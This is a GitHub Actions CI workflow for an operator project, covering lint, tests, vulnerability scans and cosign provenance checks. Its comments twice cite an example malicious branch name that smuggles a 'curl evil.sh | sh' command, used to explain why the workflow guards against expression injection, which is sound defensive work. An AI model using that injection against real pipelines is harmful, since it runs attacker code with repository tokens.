# CI — lint + tests, plus the branch-pairing guard for the release branch.
# Placeholders until Phase 1 logic lands; keep the job names stable: the
# `guard-branch-pairing` check is a required status check on `main` (see
# repository ruleset "protect-main").
name: CI

on:
  push:
    branches: [develop]
    # Issue #588(c): `v*` tag pushes now carry their own independent
    # provenance verification job (`cosign-verify-tag-image` below) —
    # previously the only check on a tagged image was release.yml's
    # in-workflow self-verification, the exact weakness issue #159
    # called out for `:dev`.
    tags:
      - "v*"
  pull_request:
    branches: [develop, main]
  # Issue #588(a): the `:dev` provenance verifier used to trigger on the
  # same push that release.yml handles, racing its `Sign + attest` step —
  # it could verify (and fail against) the fresh unsigned digest or
  # vacuously pass against the PREVIOUS image; a failed release still
  # left a green verification against the stale artifact. `workflow_run`
  # fires only AFTER the Release workflow reaches a terminal state, so
  # the gated verifier below deterministically sees the just-signed
  # digest. The lint/test/audit jobs skip this event (their `if:` gates)
  # so release completions don't double the CI surface.
  workflow_run:
    workflows: [Release]
    types: [completed]

permissions:
  contents: read

jobs:
  guard-branch-pairing:
    name: guard-branch-pairing
    if: github.event_name == 'pull_request' && github.base_ref == 'main'
    runs-on: ubuntu-latest
    steps:
      # Issue #574: `github.head_ref` (the PR source branch name) is
      # attacker-controlled on fork PRs and must never be interpolated
      # directly into a `run:` shell string — GitHub expands expressions
      # BEFORE the shell parses the script, so a branch named
      # `develop"; curl evil.sh | sh; #` would execute in the runner with
      # this job's GITHUB_TOKEN. Indirect through `env:` (the same shape
      # as the #301 PR-body guard below) so the shell only ever sees a
      # quoted variable. scripts/check_workflow_run_injections.py fences
      # the pattern repo-wide.
      - name: main may only receive PRs from develop
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          if [ "${HEAD_REF}" != "develop" ]; then
            echo "::error::Pull requests to 'main' must originate from 'develop' (got '${HEAD_REF}')."
            exit 1
          fi

  # Issue #159: independent CI gate on the published `:dev` image. The
  # `Verify provenance (digest-pinned)` step in release.yml is a
  # self-verification of the same workflow that just signed the image —
  # a malicious edit to release.yml that removes the sign + attest steps
  # would not be caught because the verify step is removed in the same
  # edit. This job is that independent gate (#588 restructure): it is
  # `workflow_run`-triggered, so it starts only after the Release
  # workflow run (the signer) reaches a terminal state — no more racing
  # the `Sign + attest` step on the same push — and the `if:` gate
  # requires a SUCCESSFUL completion, so a release whose sign step
  # failed (or never published) can never yield a green verification
  # against a stale artifact. With the release run complete, `:dev`
  # deterministically resolves to the digest that run just signed; the
  # job then runs `cosign verify-attestation` against that digest under
  # the pinned release workflow identity.
  cosign-verify-dev-image:
    name: cosign verify :dev image provenance
    runs-on: ubuntu-latest
    if: >
      github.event_name == 'workflow_run' &&
      github.event.workflow_run.name == 'Release' &&
      github.event.workflow_run.head_branch == 'develop' &&
      github.event.workflow_run.conclusion == 'success'
    steps:
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Verify the digest the Release run just signed
        env:
          # Issue #574: workflow_run context values reach the shell only
          # via env vars (head_sha / run id are attacker-influenced on
          # dispatched runs); the `if:` gate above runs in expression
          # context, never the shell.
          RELEASE_RUN_ID: ${{ github.event.workflow_run.id }}
          RELEASE_HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
        run: |
          set -euo pipefail
          # Issue #459: `imagetools inspect --raw` prints the raw manifest
          # (or image index) JSON, which has NO top-level `.digest` field —
          # read the digest from the descriptor instead. Issue #588: the
          # workflow_run gate guarantees the Release run (sign included)
          # already completed successfully, so this resolution cannot race
          # the signature — no stale-digest vacuous pass.
          DIGEST=$(docker buildx imagetools inspect --format '{{.Manifest.Digest}}' ghcr.io/anchapin/openstudio-server-operator:dev)
          if [ -z "$DIGEST" ] || [ "$DIGEST" = "null" ]; then
            echo "::error::could not resolve the :dev digest from GHCR (is the image published?)"
            exit 1
          fi
          echo "Release run ${RELEASE_RUN_ID} (head ${RELEASE_HEAD_SHA}) published ${DIGEST}; verifying."
          cosign verify-attestation \
            --certificate-identity "https://github.com/anchapin/openstudio-server-operator/.github/workflows/release.yml@refs/heads/develop" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            --type slsaprovenance \
            "ghcr.io/anchapin/openstudio-server-operator@${DIGEST}"

  # Issue #588(c): independent provenance verification for `v*` tag
  # images. release.yml's `Verify provenance exists` step on the tag path
  # is the same-workflow self-verification issue #159 called out for
  # `:dev`; this job runs in a SEPARATE workflow (this one), so a
  # malicious edit to release.yml that drops its sign + verify steps
  # cannot also silence this check. It triggers on the same tag push,
  # resolves the tag's digest from GHCR, and verifies the attestation
  # against the #169 tag identity (release.yml@refs/tags/v*). A tag push
  # is always NEW — there is no previous digest to vacuously verify —
  # and the Release workflow signs concurrently, so the loop below
  # retries until the image AND its signature land; deliberately absent
  # provenance exhausts the bounded retries and fails the job (the #588
  # acceptance criterion).
  cosign-verify-tag-image:
    name: cosign verify v* tag image provenance
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    steps:
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
      - name: Verify the tagged image's provenance
        env:
          # Issue #574: tag names may carry shell metacharacters — env
          # indirection only (same shape as release.yml's tag verify).
          TAG_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          IMAGE="ghcr.io/anchapin/openstudio-server-operator:${TAG_NAME}"
          for ATTEMPT in $(seq 1 30); do
            DIGEST=$(docker buildx imagetools inspect --format '{{.Manifest.Digest}}' "${IMAGE}" 2>/dev/null || true)
            if [ -n "$DIGEST" ] && [ "$DIGEST" != "null" ]; then
              if cosign verify-attestation \
                  --certificate-identity "https://github.com/anchapin/openstudio-server-operator/.github/workflows/release.yml@refs/tags/v*" \
                  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
                  --type slsaprovenance \
                  "ghcr.io/anchapin/openstudio-server-operator@${DIGEST}"; then
                echo "Verified provenance for ${TAG_NAME} (${DIGEST}) on attempt ${ATTEMPT}."
                exit 0
              fi
            fi
            echo "attempt ${ATTEMPT}/30: tag image or its provenance not ready yet; retrying in 30s"
            sleep 30
          done
          echo "::error::could not verify provenance for ${IMAGE} after ~15 minutes — the Release workflow's Sign + attest step must complete first (issue #588)."
          exit 1

  # Issue #588: the workflow_run trigger exists solely for the gated
  # provenance verifiers above; without this gate every Release run
  # completion would re-run the full lint/test/audit surface on top of
  # the push-event runs (doubling CI on every develop push).
  lint:
    if: github.event_name != 'workflow_run'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      # Issue #577: every Python tool this workflow runs (pyyaml for the
      # YAML-parsing guards, ruff for lint) installs from the hash-pinned
      # CI-only requirements-ci.txt — a third lockfile beside the #479
      # pair, never part of pyproject/requirements.lock/requirements.txt
      # (the #481 rule). A bare `pip install <tool>` resolves to mutable
      # PyPI latest, so the very guards that fence the supply chain would
      # run unverified code with the job's GITHUB_TOKEN — pyyaml alone
      # parses every PR's manifest content.
      # tests/test_ci_workflow_hygiene.py fences the pattern repo-wide.
      - name: Install CI tooling from hash-pinned requirements-ci.txt (#577)
        run: pip install --require-hashes -r requirements-ci.txt
      # Issue #389: fail the build if any `uses:` line in any workflow
      # resolves to a mutable major tag (e.g. `actions/checkout@v4`) instead
      # of a 40-char commit SHA. A compromised mutable tag would gain push
      # access to ghcr.io + a valid Sigstore signature; digest-pinning + SLSA
      # verification defend the artifact, not the workflow definition that
      # produces it. Anchored to `uses:` lines only — version strings in
      # image: references, comment text, or workflow filenames are NOT
      # flagged.
      - name: Enforce commit-SHA action pinning (issue #389)
        run: |
          set -euo pipefail
          if grep -REn '^[[:space:]]*-?[[:space:]]*uses:[[:space:]]+[^@[:space:]]+@v[0-9]+([[:space:]]|$)' .github/workflows/ ; then
            echo "::error::Workflows must pin third-party actions to commit SHAs, not mutable major tags (issue #389)."
            exit 1
          fi
      # Issue #574: fail the build when any workflow interpolates
      # `${{ github.* }}` directly inside a `run:` block. GitHub expands
      # expressions before the shell parses the script, so untrusted
      # values (head_ref / title / event.pull_request.* — attacker-
      # controlled on fork PRs) become classic expression injection:
      # `develop"; curl evil.sh | sh; #` as a branch name executes with
      # the job's GITHUB_TOKEN, defeating the #389 digest-pinning +
      # SLSA posture from inside the workflow itself. The guard parses
      # each workflow structurally (yaml.safe_load) and scans ONLY the
      # string value of `run:` keys — legitimate `${{ github.<safe> }}`
      # uses inside `env:` / `with:` / `if:` blocks are the indirection
      # pattern itself and are NOT flagged. tests/test_ci_workflow_hygiene.py
      # runs the same script locally as part of pytest.
      - name: "Reject github.* interpolation inside run: blocks (issue #574)"
        run: python scripts/check_workflow_run_injections.py
      # ruff installs from requirements-ci.txt above (#577, exact-pinned
      # there); the >=0.16 floor stays declared in pyproject dev deps (#68).
      - run: ruff check .
      # Issue #152: drift guard against initial-scaffold TODO(phase N)
      # placeholders (e.g. the one tracked from #146 in
      # deploy/operator-deployment.yaml). These were stage markers that
      # should be deleted once the acceptance criterion they refer to
      # ships — any surviving match is a regression of the
      # "remove-after-scaffold-completion" discipline.
      - name: Reject initial-scaffold TODO(phase N) markers in deploy/ + scripts/ (#152)
        run: |
          if grep -rE 'TODO\(phase [0-9]+\)' deploy/ scripts/ 2>/dev/null; then
              echo "::error::deploy/ or scripts/ contains a TODO(phase N) marker — these were initial-scaffold placeholders that should have been resolved by now (issue #152)"
              exit 1
          fi
      # Issue #150 — fail the build if the legacy kind-recipe Redis password
      # literal `openstudio` re-appears as a password value in source.
      # Parses YAML structurally so comments / image names / namespace labels
      # are NOT flagged.
      - name: Check no legacy Redis password literal (issue #150)
        run: bash scripts/check_redis_password_unique.sh
      # Issue #219 — Mongo companion to the #150 Redis guard. Fails the build
      # if the legacy literal `openstudio` re-appears as a Mongo password
      # value in 01-mongo.yaml / 04-web.yaml / 05-web-background.yaml /
      # 06-worker.yaml / deploy/mongo-credentials-secret.yaml.
      - name: Check no legacy Mongo password literal (issue #219)
        run: |
          bash scripts/check_mongo_password_unique.sh
        # pyyaml arrives via the shared requirements-ci.txt install (#577);
        # the Mongo companion guard uses the same yaml.safe_load.
      # Issue #301 — PR body must carry a `Scope guard:` block naming the
      # issues this PR touches and declaring what is intentionally NOT
      # being changed. Complements the #88 merge-subject hygiene rule
      # (which only governs the closing/keep-open keyword). Runs only on
      # pull_request events because pushes to develop don't carry a PR
      # body — the body is written at PR-open time and re-checked on
      # every push to the PR branch (the workflow-level
      # `on.pull_request` trigger fires for each push).
      - name: Check PR body scope-guard block (issue #301)
        if: github.event_name == 'pull_request'
        env:
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          set -euo pipefail
          if [ -z "${PR_BODY:-}" ]; then
            echo "::error::PR body is empty — issue #301 requires a 'Scope guard:' block. See docs/onboarding.md#scope-guard-issue-301."
            exit 1
          fi
          printf '%s\n' "$PR_BODY" > /tmp/pr_body.md
          bash scripts/check_pr_body_scope.sh --file /tmp/pr_body.md

  # Issue #588: skip on workflow_run completions (same rationale as lint).
  test:
    if: github.event_name != 'workflow_run'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      - name: Install runtime deps from hash-pinned lockfile (#173)
        run: |
          python -m pip install --upgrade pip
          pip install --no-cache-dir --require-hashes -r requirements.lock
      - name: Install operator + dev extras
        run: pip install --no-cache-dir -e '.[dev]'
      - name: Verify lockfile hashes in a fresh venv (#173)
        run: |
          python -m venv /tmp/lockfile-verify
          /tmp/lockfile-verify/bin/python -m pip install --upgrade pip
          /tmp/lockfile-verify/bin/pip install --require-hashes -r requirements.lock
          # Issue #479: the runtime-only lockfile the Dockerfile installs
          # from must verify hash-clean in a fresh venv as well — a broken
          # requirements.txt otherwise only surfaces at release build time.
          python -m venv /tmp/runtime-lockfile-verify
          /tmp/runtime-lockfile-verify/bin/python -m pip install --upgrade pip
          /tmp/runtime-lockfile-verify/bin/pip install --require-hashes -r requirements.txt
      - run: pytest
      # Issues #151 / #220 / #423 — guard against test-count claim drift.
      # The `N tests across M files` claim lives in FOUR prose locations:
      # AGENTS.md (#151), docs/onboarding.md (#220, plain-prose form),
      # docs/audit-dryrun-idempotency.md and docs/kind-validation.md (#423).
      # The two secondary docs drifted three separate times before #423
      # because only the guarded files failed CI — every test-adding PR
      # bumped just AGENTS.md + onboarding.md. This single step loops over
      # all four locations and fails the job when any claim desyncs from
      # `pytest --collect-only` + a glob of `tests/test_*.py`, mirroring
      # how the #387 metrics-family gate covers README + audit-doc in one
      # step. AGENTS.md carries the claim behind a `# ` prefix while the
      # docs carry plain prose; the bare-number regex extracts the same
      # numbers from both shapes, so one pattern covers all four files.
      - name: Verify test-count claims in all four docs (#151/#220/#423)
        run: |
          set -euo pipefail
          ACTUAL_TESTS=$(pytest --collect-only 2>/dev/null | tail -1 | awk '{print $1}')
          ACTUAL_FILES=$(ls tests/test_*.py | wc -l | tr -d ' ')
          echo "Actual: $ACTUAL_TESTS tests across $ACTUAL_FILES files"
          FAIL=0
          for DOC in AGENTS.md docs/onboarding.md docs/audit-dryrun-idempotency.md docs/kind-validation.md; do
            CLAIM=$(grep -oE '[0-9]+ tests across [0-9]+ files' "$DOC" | head -1 || true)
            if [ -z "$CLAIM" ]; then
              echo "::error::$DOC is missing the 'N tests across M files' claim"
              FAIL=1
              continue
            fi
            EXPECTED_TESTS=$(echo "$CLAIM" | awk '{print $1}')
            EXPECTED_FILES=$(echo "$CLAIM" | awk '{print $4}')
            echo "$DOC claim: $CLAIM"
            if [ "$ACTUAL_TESTS" != "$EXPECTED_TESTS" ] || [ "$ACTUAL_FILES" != "$EXPECTED_FILES" ]; then
              echo "::error::$DOC test-count claim is stale: actual is $ACTUAL_TESTS tests / $ACTUAL_FILES files, $DOC says '$CLAIM'"
              FAIL=1
            fi
          done
          if [ "$FAIL" -ne 0 ]; then
            echo ""
            echo "All four claim locations must agree (issues #151/#220/#423):"
            echo "  AGENTS.md + docs/onboarding.md + docs/audit-dryrun-idempotency.md"
            echo "  + docs/kind-validation.md must all read:"
            echo "  $ACTUAL_TESTS tests across $ACTUAL_FILES files"
            exit 1
          fi
      # Issue #387 — guard against the metrics-family prose claim drift that
      # #151 / #220 were designed to catch for the test-count claim. The Python
      # test in `tests/test_metrics_family_prose_claim.py` runs as part of the
      # `pytest` step above; this shell step is the parallel grep-based guard
      # that mirrors the test-count guard pattern (`grep -oE` + `awk` over
      # `EXPECTED_*_FAMILIES` tuple lengths). Two gates share the same invariant
      # — the Python test inspects the tuple values directly; the shell step
      # cross-checks the prose everywhere the claim appears. The Python test
      # is the load-bearing one for `Literal[18, 7, 3]` parity; this shell
      # step is the high-signal CI wall that prevents the prose-only claim in
      # `README.md` / `docs/audit-dryrun-idempotency.md` from drifting when a
      # maintainer reads the failure message and bumps the prose.
      - name: Verify metrics-family prose claim (#387)
        run: |
          set -euo pipefail
          bash scripts/check_metrics_family_claim.sh

  # Issue #481: supply-chain vulnerability gate. CI generates an SPDX SBOM
  # + SLSA provenance for every published image (#113) but nothing ever
  # consumed them — the operator image could carry a critical-severity
  # dependency to a digest-pinned production Deployment with all checks
  # green. This job closes that loop at PR time (the release.yml scans
  # cover the actually-pushed image):
  #   (a) pip-audit over the hash-pinned requirements.lock (runtime+dev,
  #       exactly what CI itself installs). Severity floor: fails the
  #       build on ANY known advisory — deliberately stricter than
  #       critical/high, because the PyPI/OSV advisory feed pip-audit
  #       queries is not severity-filtered. Triaged exceptions live in
  #       .pip-audit-ignore.txt.
  #   (b) trivy scan of the locally-built image (build with load=true,
  #       never pushed) with a CRITICAL,HIGH severity floor. Triaged
  #       exceptions live in .trivyignore. release.yml re-scans the
  #       pushed image with the same floor BEFORE the digest-pin commit.
  # Issue #588: skip on workflow_run completions (same rationale as lint).
  audit:
    if: github.event_name != 'workflow_run'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      # pip-audit is a CI-only auditing tool — deliberately NOT a project
      # dependency (#481 constraint): it appears in neither lockfile nor
      # pyproject.toml, so it can never enter the runtime image. Since #577
      # it installs hash-pinned from requirements-ci.txt (the CI-only third
      # lockfile) — the vulnerability gate must not itself be built from
      # mutable-latest PyPI code.
      - name: pip-audit requirements.lock (issue #481)
        run: |
          set -euo pipefail
          pip install --require-hashes -r requirements-ci.txt
          # Turn each non-comment line of .pip-audit-ignore.txt into a
          # --ignore-vuln argument (triaged exceptions only — see that
          # file's header for the triage rules).
          set --
          while IFS= read -r id; do
            set -- "$@" --ignore-vuln "$id"
          done < <(grep -vE '^[[:space:]]*(#|$)' .pip-audit-ignore.txt || true)
          pip-audit --require-hashes -r requirements.lock "$@"
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
      # Local build of the exact production image (same Dockerfile the
      # release workflow builds), loaded into the daemon — never pushed.
      - name: Build image locally (no push)
        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
        with:
          context: .
          push: false
          load: true
          tags: oscm-operator:ci-vuln-scan
      # Severity floor: CRITICAL,HIGH findings fail the build (exit-code 1).
      - name: Trivy scan the built image (issue #481)
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: oscm-operator:ci-vuln-scan
          severity: CRITICAL,HIGH
          exit-code: 1
          trivyignores: .trivyignore
          ignore-unfixed: true
      # Issue #642: CVE/freshness gate for the digest-pinned rclone sidecar
      # (archival.py RCLONE_IMAGE, pinned by #124/#417). The scan above
      # covers only the operator image; the rclone container — the one that
      # holds live S3/GCS/Azure credentials via envFrom and egresses to
      # 0.0.0.0/0:443 — was invisible to every gate: Dependabot's docker
      # ecosystem sees Dockerfile FROM lines only (.github/dependabot.yml
      # section (c)), so the pin had immutability but no scanning. A digest
      # pin freezes the artifact, not its CVE record: the same frozen
      # digest accumulates gate-visible findings as advisories publish.
      #
      # Rides the audit job (not a separate `schedule:` trigger): the
      # weekly Dependabot pass (#480) opens bump PRs that run this job at
      # least weekly, so freshness is covered without doubling the
      # lint/test surface on a timer.
      #
      # The reference is EMITTED from openstudio_operator.archival (stdlib-
      # only import chain, hence PYTHONPATH=src with no install) so the pin
      # stays single-source (#417) — the digest must never be hardcoded in
      # this workflow. tests/test_rclone_image_ci_gate.py fences that.
      - name: Emit RCLONE_IMAGE from archival.py (issue #642)
        id: emit-rclone-image
        run: |
          set -euo pipefail
          RCLONE_IMAGE=$(PYTHONPATH=src python3 -c "from openstudio_operator.archival import RCLONE_IMAGE; print(RCLONE_IMAGE)")
          if ! printf '%s' "$RCLONE_IMAGE" | grep -qE '^rclone/rclone:[^@[:space:]]+@sha256:[0-9a-f]{64}$'; then
            echo "::error::RCLONE_IMAGE from archival.py is not a digest-pinned rclone/rclone reference: ${RCLONE_IMAGE}"
            exit 1
          fi
          echo "Scanning ${RCLONE_IMAGE}"
          echo "rclone-image=${RCLONE_IMAGE}" >> "$GITHUB_OUTPUT"
      # Same floor + triage conventions as the operator-image scan above:
      # CRITICAL,HIGH, exit-code 1, ignore-unfixed, shared .trivyignore
      # (new entries need a justification comment + follow-up issue).
      #
      # Refresh runbook (when this gate fires on the frozen digest):
      #   1. docker buildx imagetools inspect rclone/rclone:<new-ver>
      #      → copy the new sha256 digest;
      #   2. update RCLONE_IMAGE in src/openstudio_operator/archival.py
      #      (the ONLY pin to edit — the digest constant is derived, #417);
      #   3. the CEL string literal in deploy/storage-cronjob.yaml must be
      #      refreshed in the same commit — the #641 cross-fence test
      #      (tests/test_deploy_manifests.py) compares the CEL literal
      #      against archival.RCLONE_IMAGE and FAILS CI if the CEL update
      #      is missed, so a partial refresh cannot land green.
      - name: Trivy scan the pinned rclone image (issue #642)
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          image-ref: ${{ steps.emit-rclone-image.outputs.rclone-image }}
          severity: CRITICAL,HIGH
          exit-code: 1
          trivyignores: .trivyignore
          ignore-unfixed: true

